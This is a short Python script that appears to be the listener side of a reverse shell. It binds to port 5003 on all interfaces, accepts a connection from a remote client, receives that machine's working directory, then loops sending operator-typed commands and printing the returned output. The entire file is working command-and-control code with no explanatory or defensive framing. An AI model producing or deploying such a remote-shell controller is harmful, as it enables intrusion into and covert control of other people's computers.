import socket


SEPARATOR = "<sep>"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024

soc = socket.socket()
soc.bind((SERVER_HOST, SERVER_PORT))

soc.listen(5)
print(f'Listening as {SERVER_HOST}:{SERVER_PORT}')

client_socket, client_adress = soc.accept()
# print(f'{client_adress[0]}:{client_adress[1]} Connected')

cwd = client_socket.recv(BUFFER_SIZE).decode('utf-8')
print('[+] Current working directory: ', cwd)

while True:
    command = input(f'{cwd}> ')
    if not command.strip():
        continue

    client_socket.send(command.encode('utf-8'))
    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER_SIZE).decode('utf-8')
    results, cwd = output.split(SEPARATOR)
    
    print(results)